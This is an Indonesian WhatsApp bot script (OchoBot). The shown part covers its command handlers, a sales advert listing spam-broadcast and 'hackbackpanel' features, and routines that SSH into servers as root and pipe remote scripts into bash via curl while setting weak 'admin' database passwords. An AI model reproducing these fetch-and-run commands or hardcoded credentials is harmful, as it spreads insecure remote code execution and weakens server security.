  if (text && text.toLowerCase() === "all") {
    if (!m.isGroup) return Reply("❌ Fitur ini hanya bisa digunakan di grup.");

    const metadata = await conn.groupMetadata(m.chat);
    const participants = metadata.participants;

    let removed = 0;

    for (let user of participants) {
      let jid = user.id;

      // Kalau @lid, convert ke jid normal
      if (jid.endsWith("@lid")) {
        jid = user?.jid || (user.id.split("@")[0] + "@s.whatsapp.net");
      }

      if (jasherVIPDB.owners.includes(jid)) {
        jasherVIPDB.owners = jasherVIPDB.owners.filter(x => x !== jid);
        removed++;
      }
    }

    fs.writeFileSync(jasherVIPPath, JSON.stringify(jasherVIPDB, null, 2));
    return Reply(`✅ Berhasil menghapus ${removed} member grup dari Pt Jasher.`);
  }

  // MODE 1 ORANG
  if (!text && !m.quoted) 
    return Reply(`Kirim nomor / reply orang\nContoh: .delptjs 628xxx\nAtau:\n.delptjs all`);

  let target = m.quoted
    ? m.quoted.sender
    : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

  // Kalau masih @lid, normalisasi juga
  if (target.endsWith("@lid")) {
    target = target.split("@")[0] + "@s.whatsapp.net";
  }

  if (!jasherVIPDB.owners.includes(target)) 
    return Reply("❌ Dia bukan Pt Jasher.");

  jasherVIPDB.owners = jasherVIPDB.owners.filter(x => x !== target);
  fs.writeFileSync(jasherVIPPath, JSON.stringify(jasherVIPDB, null, 2));

  Reply("✅ Berhasil menghapus dari Pt Jasher.");
}
break;

//=================== List Jasher ====================
case "listownjs": {
  if (!isCreator) return Reply(mess.owner);
  const list = jasherDB.owners.map((x, i) => `${i + 1}. @${x.replace(/[^0-9]/g, '')}`).join("\n") || "Belum Ada Own Jasher.";
  conn.sendMessage(m.chat, {
    text: `📛 *Daftar Own Jasher:*\n\n${list}`,
    mentions: jasherDB.owners
  }, { quoted: m });
}
break;

//=================== List Jasher VIP ====================
case "listptjs": {
  if (!isCreator) return Reply(mess.owner);
  const list = jasherVIPDB.owners.map((x, i) => `${i + 1}. @${x.replace(/[^0-9]/g, '')}`).join("\n") || "Belum ada PT JASHER.";
  conn.sendMessage(m.chat, {
    text: `👑 *Daftar Pt Jasher:*\n\n${list}`,
    mentions: jasherVIPDB.owners
  }, { quoted: m });
}
break;

//=============================================//

case "sc": {
  if (!m.isGroup) return m.reply('Khusus dalam grup!')

  const teks = `*📦SC OCHOBOT V5 NEW RILIS*

𝗛𝗔𝗥𝗚𝗔:
• 20𝗞 𝗡𝗢 𝗘𝗡𝗖 𝗡𝗢 𝗨𝗣
• 30𝗞 𝗡𝗢 𝗘𝗡𝗖 𝗙𝗥𝗘𝗘 𝗨𝗣
• 50𝗞 𝗥𝗘𝗦𝗦𝗘𝗟𝗘𝗥 𝗙𝗥𝗘𝗘 𝗔𝗗𝗣
• 70𝗞 𝗢𝗪𝗡 𝗙𝗥𝗘𝗘 𝗔𝗗𝗠𝗜𝗡 𝗖𝗛

𝗕𝗘𝗡𝗘𝗙𝗜𝗧 𝗥𝗘𝗦𝗦𝗘𝗟𝗘𝗥 𝗗𝗔𝗡 𝗢𝗪𝗡 𝗕𝗜𝗦𝗔 𝗧𝗔𝗡𝗬𝗔 𝗞𝗘 𝗣𝗠

---

*🗂️ ISI FITUR OCHOBOT V5 NEW UPDATE :*

*▧✨ O C H O B O T ✨▧*
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻

*INFO BOT*
🤖 Bot Name : *Ocho Bot*
💿 Version : *3.0*
📡 Mode : *🌍 Public*
📅 Time : *13.41.31*
⚙️ Total Fitur : *362*
👨🏻‍💻 Creator : *Al Luffy*

*INFO USER :*
👤 Nama: *AL LUFFY*
💳 Status: *Owner*

┏━━━━━⫷ NEW MENU ⫸━━━
┃➵ installermenu ( menu new Install )
┃➵ jpmchmenu ( menu open js )
┃➵ hackbackpanel
┃➵ installpanel
┃➵ uninstallpanel
┃➵ startwings
┃➵ subdomain
┃➵ createch
┃➵ sync
┃➵ pinterest
┃➵ clearchat
┃➵ linkserver
┃➵ facebook 
┃➵ capcut
┃➵ instagram
┃➵ aiimage
┃➵ buatgambar
┃➵ aifoto
┃➵ iqc
┃➵ ytmp3
┃➵ ytmp4
┃➵ play
┃➵ playvid
┃➵ mediafire
┃➵ remini2
┃➵ antikatach
┃➵ jpmchnew ( Jpmch Tanpa Id )
┃➵ listch ( List Ch Lu Admin )
┃➵ antilinkch
┃➵ antikataunchek
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ OWNER MENU ⫸━━━
┃➵ autopromosi
┃➵ autoread
┃➵ autoreadsw
┃➵ autotyping
┃➵ addowner
┃➵ addownerall
┃➵ listowner
┃➵ delowner
┃➵ delownerall
┃➵ self/public
┃➵ block
┃➵ unblok
┃➵ setbiobot
┃➵ setnamabot
┃➵ clearsession
┃➵ restart
┃➵ addcase
┃➵ delcase
┃➵ getcase
┃➵ editcase
┃➵ spekvps
┃➵ uptime
┃➵ totalfitur
┃➵ autoblock
┃➵ backup
┃➵ gconly
┃➵ clearchat
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ PANEL MENU V1 ⫸━━━
┃➵ 1gb
┃➵ 2gb
┃➵ 3gb
┃➵ 4gb
┃➵ 5gb
┃➵ 6gb
┃➵ 7gb
┃➵ 8gb
┃➵ 9gb
┃➵ 10gb
┃➵ unlimited
┃➵ createserver
┃➵ cadp
┃➵ cadmin
┃➵ delpanel
┃➵ delallserver
┃➵ delalluser
┃➵ deladmin
┃➵ delalladmin
┃➵ listpanel
┃➵ listadmin
┃➵ updomain
┃➵ upapikey
┃➵ upcapikey
┃➵ addakses
┃➵ addreseller
┃➵ delakses
┃➵ delreseller
┃➵ listreseller
┃➵ resetreseller
┃➵ totalpanel
┃➵ totaladmin
┃➵ linkserver
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ PANEL MENU V2 ⫸━━━
┃➵ 1gb-v2
┃➵ 2gb-v2
┃➵ 3gb-v2
┃➵ 4gb-v2
┃➵ 5gb-v2
┃➵ 6gb-v2
┃➵ 7gb-v2
┃➵ 8gb-v2
┃➵ 9gb-v2
┃➵ 10gb-v2
┃➵ unlimited-v2
┃➵ createserver2
┃➵ cadp
┃➵ cadmin
┃➵ delpanel-v2
┃➵ delallserver-v2
┃➵ delalluser-v2
┃➵ deladmin-v2
┃➵ delalladmin-v2
┃➵ listpanel-v2
┃➵ listadmin-v2
┃➵ updomain
┃➵ upapikey
┃➵ upcapikey
┃➵ addakses2
┃➵ addreseller-v2
┃➵ delakses2
┃➵ delreseller-v2
┃➵ listreseller-v2
┃➵ resetreseller-v2
┃➵ totalpanel-v2
┃➵ totaladmin-v2
┃➵ linkserver
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ INSTALLER MENU ⫸━━━
┃➵ hackbackpanel
┃➵ installpanel
┃➵ uninstallpanel
┃➵ installtema
┃➵ uninstallthema 
┃➵ startwings
┃➵ subdomain
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ GROUP MENU ⫸━━━
┃➵ add
┃➵ kick
┃➵ close
┃➵ open
┃➵ hidetag
┃➵ kudetagc
┃➵ leave
┃➵ tagall
┃➵ promote
┃➵ demote
┃➵ resetlinkgc
┃➵ getdeskgc
┃➵ totalmember
┃➵ linkgc
┃➵ bljpm
┃➵ delbljpm
┃➵ listdaftarjpm
┃➵ listonline
┃➵ listgrup
┃➵ joingrup
┃➵ getppgrup
┃➵ getpp
┃➵ buatgc
┃➵ antilink
┃➵ antilinkch
┃➵ antikataunchek
┃➵ welcome
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ TOOLS MENU ⫸━━━
┃➵ brat
┃➵ tourl
┃➵ tourl2
┃➵ berita
┃➵ ssweb
┃➵ translate
┃➵ infogempa
┃➵ infocuaca
┃➵ wallpaper
┃➵ fakechat
┃➵ shortlink
┃➵ shortlink-dl
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ STORE MENU ⫸━━━
┃➵ addrespon
┃➵ delrespon
┃➵ listrespon
┃➵ done
┃➵ proses
┃➵ jpm (Teks)
┃➵ jpm2 (Foto)
┃➵ jpm3 (Video)
┃➵ jpmtesti
┃➵ jpmslide
┃➵ jpmslideht
┃➵ sendtesti
┃➵ payment
┃➵ pushkontak
┃➵ cekidgrup
┃➵ savekontak
┃➵ setjedapush
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ CHANNEL MENU ⫸━━━
┃➵ jpmchmenu ( Mau Open Per Js An? Ketik )
┃➵ jpmchteks (Teks)
┃➵ jpmchbutton (Button)
┃➵ jpmchfoto (Foto)
┃➵ jpmchvideo (Video)
┃➵ jpmchaudio (Audio)
┃➵ jpmchdoc (File)
┃➵ setdelayjpmch (seting delay)
┃➵ setbotjpmch (seting on/off)
┃➵ autojpmch
┃➵ addteks
┃➵ delteks
┃➵ listteks
┃➵ statusjpmch
┃➵ jpmchjumlah (Jumlah)
┃➵ jpmchvip (BuatPtJs)
┃➵ addptjs (PartnerJs)
┃➵ delptjs (PartnerJs)
┃➵ addownjs (OwnerJs)
┃➵ delownjs (OwnerJs)
┃➵ addid (Channel)
┃➵ addidch ( Tanpa Id Channel )
┃➵ addallid (Semua Id Channel)
┃➵ delid (Channel)
┃➵ delallid (Semua Id Channel)
┃➵ listid (Channel)
┃➵ seturlsatu (setjpmchbutton)
┃➵ seturldua (setjpmchbutton)
┃➵ joinchannel
┃➵ createch
┃➵ sync
┃➵ antikatach
┃➵ jpmchnew ( Jpmch Tanpa Id )
┃➵ listch ( List Ch Lu Admin )
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ PAYMENT MENU ⫸━━━
┃➵ dana
┃➵ ovo
┃➵ gopay
┃➵ qris
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ OTHER MENU ⫸━━━
┃➵ cekidch
┃➵ cekidgc
┃➵ reactch
┃➵ rvo
┃➵ qc
┃➵ stiker
┃➵ stikerwm
┃➵ pinterest
┃➵ aiimage
┃➵ buatgambar
┃➵ aifoto
┃➵ iqc
┃➵ remini2
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ DOWNLOAD MENU ⫸━━━
┃➵ tiktok
┃➵ tiktokmp3
┃➵ facebook
┃➵ capcut
┃➵ instagram
┃➵ ytmp3
┃➵ ytmp4
┃➵ play
┃➵ playvid
┃➵ mediafire
┗━━━━━━━━━━━━⭓

© 2025 Ocho Bot

*Order? Kesini Bang*
https://t.me/alluffystore

*Testimoni*
https://whatsapp.com/channel/0029VavsEpc8kyyG9PxG8s38

*Marketplace*
https://whatsapp.com/channel/0029VbAs8PeLtOjL3rpe4T42

*ORDER SCRIPT? ATAU CEK FITUR // RESELLER? // OWNER? PM TELEGRAM ATAU KE GRUP*`

  const participants = m.isGroup ? await conn.groupMetadata(m.chat).then(res => res.participants.map(v => v.id)) : []

  conn.sendMessage(m.chat, {
    text: teks,
    mentions: participants,
    contextInfo: {
      mentionedJid: participants,
      externalAdReply: {
        title: "OchoBot V3",
        body: "Chat Penjual via WhatsApp (Grup)",
        thumbnailUrl: "https://img1.pixhost.to/images/7917/631342826_ochobot.jpg",
        sourceUrl: global.linkGroup || "https://chat.whatsapp.com/Bj9jlpu6n0iFTfXVK7HdVj",
        mediaType: 1,
        renderLargerThumbnail: true,
        showAdAttribution: true
      }
    }
  }, { quoted: m })
}
break

//=============================================//

case "backup": case "ambilsc": case "backupsc": {
if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return m.reply(mess.owner)
if (!isCreator) return m.reply(mess.owner);
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
let name = `Ocho-Botz-${global.versi}`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await conn.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//=============================================//

case "addidch": {
  if (!isCreator) return m.reply(mess.owner);

  try {
    // Pastikan command diketik di channel
    if (!m.chat.endsWith("@newsletter")) {
      return m.reply("❌ Perintah ini hanya bisa digunakan di dalam channel.");
    }

    let id = m.chat;

    // Baca file JSON
    let daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));

    // Cek apakah ID sudah ada
    if (daftarSaluran.includes(id)) {
      return m.reply('❌ ID saluran sudah ada dalam daftar.');
    }

    // Tambahkan ID baru
    daftarSaluran.push(id);

    // Simpan kembali ke file JSON
    fs.writeFileSync('./library/database/idsaluran.json', JSON.stringify(daftarSaluran, null, 2));
    m.reply(`✅ ID saluran berhasil ditambahkan:\n${id}`);
  } catch (error) {
    console.error("Error saat menambahkan ID:", error);
    m.reply('❌ Terjadi kesalahan saat menambahkan ID.');
  }
}
break;

//=============================================//

case "gconly": {
    if (!isCreator) return m.reply(mess.owner)

    const fs = require('fs')
    const path = './library/database/status_gconly.json'

    // === Jika file belum ada, buat default ===
    if (!fs.existsSync(path)) {
        fs.writeFileSync(path, JSON.stringify({ gconly: false }, null, 2));
    }

    // === Baca file JSON ===
    const data = JSON.parse(fs.readFileSync(path, 'utf8'));

    if (args[0] === 'on') {
        data.gconly = true;
        fs.writeFileSync(path, JSON.stringify(data, null, 2));
        global.gconly = true;
        m.reply('✅ Mode *Group Only* telah diaktifkan. Bot hanya akan merespon chat dari grup.');
    } else if (args[0] === 'off') {
        data.gconly = false;
        fs.writeFileSync(path, JSON.stringify(data, null, 2));
        global.gconly = false;
        m.reply('❌ Mode *Group Only* dimatikan. Bot kembali merespon semua chat.');
    } else {
        m.reply(`Gunakan:\n- *.gconly on* untuk mengaktifkan\n- *.gconly off* untuk menonaktifkan`)
    }
}
break

//=============================================//

case "autoblock":
  if (!isCreator) return m.reply('❌ Hanya Owner yang bisa mengatur autoblock!');
  if (!args[0]) return m.reply('❗ Contoh penggunaan: *.autoblock on* atau *.autoblock off*');

  autoblockData.enabled = args[0].toLowerCase() === 'on';
  fs.writeFileSync('./library/database/autoblock.json', JSON.stringify(autoblockData, null, 2));

  return m.reply(`✅ Auto-block PM sekarang *${autoblockData.enabled ? 'AKTIF' : 'NONAKTIF'}*`);
  
//=============================================//
  
case "autojpmch": {
  if (!isCreator) return Reply(mess.owner);
  const fs = require('fs');
  const path = './library/database/autojpmch_status.json';

  let data = { status: false };
  if (fs.existsSync(path)) {
    data = JSON.parse(fs.readFileSync(path));
  }

  if (!args[0]) {
    return Reply(`📢 Status saat ini: *${data.status ? "ON ✅" : "OFF ❌"}*\nGunakan:\n.autojpmch on\n.autojpmch off`);
  }

  const cmd = args[0].toLowerCase();
  if (cmd === 'on') {
    data.status = true;
    fs.writeFileSync(path, JSON.stringify(data, null, 2));
    return Reply("✅ AutoJPMCH *diaktifkan*.");
  } else if (cmd === 'off') {
    data.status = false;
    fs.writeFileSync(path, JSON.stringify(data, null, 2));
    return Reply("❌ AutoJPMCH *dimatikan*.");
  } else {
    return Reply("⚠️ Format salah. Gunakan:\n.autojpmch on\n.autojpmch off");
  }
}

case "addteks": {
  if (!isCreator) return m.reply(mess.owner);
  const fs = require('fs');
  const path = './library/database/autojpmch_text.json';
  if (!text) return m.reply("❌ Masukkan teks yang ingin ditambahkan.");

  let data = { texts: [] };
  if (fs.existsSync(path)) {
    data = JSON.parse(fs.readFileSync(path));
  }

  data.texts.push(text);

  // Stringify dulu
  let jsonString = JSON.stringify(data, null, 2);

  // Tambahin baris kosong antar elemen array
  jsonString = jsonString.replace(/",\n\s+"/g, '",\n\n    "');

  fs.writeFileSync(path, jsonString);

  return m.reply("✅ Teks berhasil ditambahkan.");
}

case "delteks": {
  if (!isCreator) return Reply(mess.owner);
  const fs = require('fs');
  const path = './library/database/autojpmch_text.json';
  if (!text) return Reply("❌ Masukkan nomor atau isi teks untuk dihapus.");

  let data = { texts: [] };
  if (fs.existsSync(path)) {
    data = JSON.parse(fs.readFileSync(path));
  }

  let removed = false;
  if (!isNaN(text)) {
    const index = parseInt(text) - 1;
    if (data.texts[index]) {
      data.texts.splice(index, 1);
      removed = true;
    }
  } else {
    const index = data.texts.findIndex(t => t.toLowerCase().includes(text.toLowerCase()));
    if (index !== -1) {
      data.texts.splice(index, 1);
      removed = true;
    }
  }

  if (removed) {
    fs.writeFileSync(path, JSON.stringify(data, null, 2));
    return Reply("🗑️ Teks berhasil dihapus.");
  } else {
    return Reply("❌ Teks tidak ditemukan.");
  }
}

case "listteks": {
  if (!isCreator) return Reply(mess.owner);
  const fs = require('fs');
  const path = './library/database/autojpmch_text.json';
  let data = { texts: [] };
  if (fs.existsSync(path)) {
    data = JSON.parse(fs.readFileSync(path));
  }

  const list = data.texts.map((t, i) => `*${i + 1}.* ${t}`).join('\n') || '_Belum ada teks_';
  return Reply(`📄 *Daftar Teks AutoJPMCH:*\n\n${list}`);
}

case "cekstatusjpmch": {
  if (!isCreator) return Reply(mess.owner);
  const fs = require('fs');
  const path = './library/database/autojpmch_status.json';

  let data = { status: false };
  if (fs.existsSync(path)) {
    data = JSON.parse(fs.readFileSync(path));
  }

  return Reply(`📊 Status AutoJPMCH saat ini: *${data.status ? "ON ✅" : "OFF ❌"}*`);
}

// ================================
// BUAT CHANNEL DENGAN PILIHAN BUTTON (TANPA DESKRIPSI)
// ================================
case "buatch":
case "createch": {
  if (!isCreator) return m.reply(mess.owner);
  if (!text.includes('|')) return m.reply(`*Contoh Penggunaan:*\n${cmd} Nama Channel | Jumlah`);

  let [chName, chCount] = text.split('|').map(v => v.trim());
  let jumlah = parseInt(chCount) || 1;

  if (!chName || !jumlah) return m.reply(`*Contoh Penggunaan:*\n${cmd} Nama Channel | Jumlah`);

  // Simpan data sementara (multi user aman)
  global.tempChannel = global.tempChannel || {};
  global.tempChannel[m.sender] = { chName, jumlah };

  await conn.sendMessage(m.chat, {
    caption: `📌 Nama Channel: *${chName}*\n🔢 Jumlah: *${jumlah}*\n\nSilakan pilih format channel yang ingin dibuat:`,
    image: { url: global.image.reply }, // bisa pakai { url: './reply.jpg' } lokal
    footer: `© 2025 ${botname}`,
    buttons: [
      { buttonId: '.buatchid', buttonText: { displayText: '🆔 Buat Versi ID' }, type: 1 },
      { buttonId: '.buatchlink', buttonText: { displayText: '🔗 Buat Versi Link' }, type: 1 }
    ],
    headerType: 4
  }, { quoted: m });
}
break;

// ================================
// BUAT CHANNEL VERSI ID
// ================================
case "buatchid": {
  let data = global.tempChannel?.[m.sender];
  if (!data) return m.reply("❌ Tidak ada request channel yang pending!");

  let { chName, jumlah } = data; // Deskripsi dihapus

  try {
    let allIds = [];
    for (let i = 1; i <= jumlah; i++) {
      try {
        let createCh = await conn.newsletterCreate(
          chName + (jumlah > 1 ? ` ${i}` : ""),
          "" // Deskripsi kosong
        );
        allIds.push(createCh.id);
        if (i < jumlah) await new Promise(r => setTimeout(r, 2000));
      } catch (e) {
        console.error(`Gagal membuat channel ke-${i}:`, e);
      }
    }

    let listIds = allIds.map((id, idx) => `*ID ${idx + 1}*\n${id}`).join('\n\n');
    let message = `✅ *SUKSES MEMBUAT CHANNEL ${jumlah}* ✅\n\n📌 Nama: ${chName}${jumlah > 1 ? ` 1-${jumlah}` : ""}\n\n🆔 *ALL ID:*\n${listIds}`; // Deskripsi dihapus
    await conn.sendMessage(m.chat, { text: message });
    delete global.tempChannel[m.sender];
  } catch (e) {
    console.error(e);
    m.reply("❌ Gagal membuat channel!");
  }
}
break;

// ================================
// BUAT CHANNEL VERSI LINK
// ================================
case "buatchlink": {
  let data = global.tempChannel?.[m.sender];
  if (!data) return m.reply("❌ Tidak ada request channel yang pending!");

  let { chName, jumlah } = data; // Deskripsi dihapus

  try {
    let allLinks = [];
    for (let i = 1; i <= jumlah; i++) {
      try {
        let createCh = await conn.newsletterCreate(
          chName + (jumlah > 1 ? ` ${i}` : ""),
          "" // Deskripsi kosong
        );
        let inviteCode = createCh?.invite || createCh?.invite_code || createCh?.code;

        if (inviteCode) {
          let inviteUrl = ``; // Pastikan format URL benar
          allLinks.push(inviteUrl);
        } else {
          console.warn(`Tidak dapat memperoleh kode undangan untuk channel ke-${i}`);
          allLinks.push("Tidak dapat memperoleh link undangan");
        }
        if (i < jumlah) await new Promise(r => setTimeout(r, 2000));
      } catch (e) {
        console.error(`Gagal membuat channel ke-${i}:`, e);
        allLinks.push("Gagal membuat channel");
      }
    }

    let listLinks = allLinks.map((link, idx) => `*LINK ${idx + 1}*\n${link}`).join('\n\n');
    let message = `✅ *SUKSES MEMBUAT CHANNEL ${jumlah}* ✅\n\n📌 Nama: ${chName}${jumlah > 1 ? ` 1-${jumlah}` : ""}\n\n🔗 *ALL LINK:*\n${listLinks}`; // Deskripsi dihapus
    await conn.sendMessage(m.chat, { text: message });
    delete global.tempChannel[m.sender];
  } catch (e) {
    console.error(e);
    m.reply("❌ Gagal membuat channel!");
  }
}
break;

//=============================================//

case "pinterest":
case "pin": {
    if (!text) return m.reply(`*Contoh:* ${cmd} Anime`);

    const axios = require('axios');
    const https = require('https');
    const qs = require('qs');

    // ===== Fungsi Pinterest langsung di sini =====
    async function pinterestV1(query) {
        const agent = new https.Agent({ keepAlive: true });
        try {
            const home = await axios.get('https://www.pinterest.com/', {
                httpsAgent: agent,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml'
                }
            });
            const raw = home.headers['set-cookie'] || [];
            const cookies = raw.map(c => c.split(';')[0]).join('; ');
            const csrf = (raw.find(c => c.startsWith('csrftoken=')) || '')
                .split('=')[1]?.split(';')[0] || '';

            const source_url = `/search/pins/?q=${encodeURIComponent(query)}`;
            const data = {
                options: { query, field_set_key: 'react_grid_pin', is_prefetch: false, page_size: 25 },
                context: {}
            };
            const body = qs.stringify({ source_url, data: JSON.stringify(data) });

            const res = await axios.post(
                'https://www.pinterest.com/resource/BaseSearchResource/get/',
                body,
                {
                    httpsAgent: agent,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                        'Accept': 'application/json, text/javascript, */*; q=0.01',
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'X-CSRFToken': csrf,
                        'X-Requested-With': 'XMLHttpRequest',
                        'Origin': 'https://www.pinterest.com',
                        'Referer': `https://www.pinterest.com/search/pins/?q=${encodeURIComponent(query)}`,
                        'Cookie': cookies
                    }
                }
            );

            const pins = res.data.resource_response.data.results
                .slice(0, 25)
                .map(p => ({
                    link: `https://www.pinterest.com/pin/${p.id}/`,
                    directLink: p.images?.orig?.url || p.images?.['236x']?.url
                }));
            return pins;

        } catch (e) {
            console.error("Pinterest Error:", e.message);
            return { error: e.message };
        }
    }

    // ===== Proses case =====
    try {
        await m.reply("⏳ Sedang mencari gambar...");

        const data = await pinterestV1(text);
        if (!data || data.error || data.length === 0) return m.reply("❌ Tidak ada hasil ditemukan.");

        // Ambil direct link
        const result = data.map(v => v.directLink);

        // Batasi maksimal 5 gambar
        const jumlah = Math.min(result.length, 5);

        // Kirim album
        for (let i = 0; i < jumlah; i++) {
            await conn.sendMessage(m.chat, {
                image: { url: result[i] },
                caption: `📌 Hasil Pinterest dari pencarian: *${text}*`
            }, { quoted: m });
        }

    } catch (err) {
        console.error(err);
        m.reply("❌ Terjadi kesalahan saat mengambil gambar dari Pinterest.");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Luffy\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Luffy\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
